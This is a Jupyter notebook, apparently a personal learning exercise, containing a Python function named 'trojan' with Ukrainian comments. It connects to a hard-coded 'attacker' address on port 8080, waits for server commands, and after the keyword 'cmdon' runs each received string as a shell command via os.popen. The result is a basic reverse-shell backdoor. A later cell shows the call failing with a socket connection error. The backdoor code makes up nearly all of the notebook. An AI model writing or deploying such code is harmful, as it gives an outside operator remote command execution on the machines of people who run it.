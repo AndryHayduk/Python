{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "finished-question",
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "import socket\n",
    "import threading\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "finite-basis",
   "metadata": {},
   "outputs": [],
   "source": [
    "def trojan():\n",
    "    # IP-адрес атакуйочого\n",
    "    HOST = '192.168.0.104'\n",
    "    # Порт, з яким ми пряацюємо\n",
    "    PORT = 8080\n",
    "    \n",
    "    # Створюємо ехо-сервера(відправивзапрос-полчуив відповідь)1-означає що ми працюємо з ipv4-адрисацією 2-використовуємо TCP зєдняння замість UDP\n",
    "    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    #Вказуємо IP-адрес хоста і порт\n",
    "    client.connect((HOST, PORT))\n",
    "    while True:\n",
    "        # Водим команду сервера\n",
    "        server_command = client.recv(1024).decode('cp866')\n",
    "        # якзо команда співпала з основним словом 'cmdon', запускаємо режим работи з терміналом\n",
    "        if server_command == 'cmdon':\n",
    "            cmd_mode = True\n",
    "            # Відправляємо інформацію на сервер\n",
    "            client.send('Получений доступ до сервера'.encode('cp866'))\n",
    "            continue\n",
    "        # Якщо команда співпала з основним словом 'cmdoff', вмходимо з режиму роботи в тернміналі\n",
    "        if server_command == 'cmdoff':\n",
    "            cmd_mode = False\n",
    "        # Якзо запущено роботу з терміналом, вводим команду в термінал через сервер\n",
    "        if cmd_mode:\n",
    "            os.popen(server_command)\n",
    "        # Якзо ж робота з терміналом закінчена м — можно водити будь які команди \n",
    "        else:\n",
    "            if server_command == 'hello':\n",
    "                print('Hello World!')\n",
    "        # Якщо команда дойшла до клієнта - виславити відповідь\n",
    "        client.send(f'{server_command} успішно відправлена!'.encode('cp866'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "available-forward",
   "metadata": {},
   "outputs": [
    {
     "ename": "OSError",
     "evalue": "[WinError 10057] A request to send or receive data was disallowed because the socket is not connected and (when sending on a datagram socket using a sendto call) no address was supplied",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mOSError\u001b[0m                                   Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-42-8462a4bd6ffc>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mtrojan\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;32m<ipython-input-41-9d3798e43498>\u001b[0m in \u001b[0;36mtrojan\u001b[1;34m()\u001b[0m\n\u001b[0;32m     11\u001b[0m     \u001b[1;32mwhile\u001b[0m \u001b[1;32mTrue\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     12\u001b[0m         \u001b[1;31m# Водим команду сервера\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 13\u001b[1;33m         \u001b[0mserver_command\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mclient\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;36m1024\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'cp866'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     14\u001b[0m         \u001b[1;31m# якзо команда співпала з основним словом 'cmdon', запускаємо режим работи з терміналом\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     15\u001b[0m         \u001b[1;32mif\u001b[0m \u001b[0mserver_command\u001b[0m \u001b[1;33m==\u001b[0m \u001b[1;34m'cmdon'\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mOSError\u001b[0m: [WinError 10057] A request to send or receive data was disallowed because the socket is not connected and (when sending on a datagram socket using a sendto call) no address was supplied"
     ]
    }
   ],
   "source": [
    "trojan()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "associate-directory",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "associate-wilderness",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "perfect-syntax",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "addressed-baker",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "gorgeous-blogger",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "functioning-compact",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "premium-prescription",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
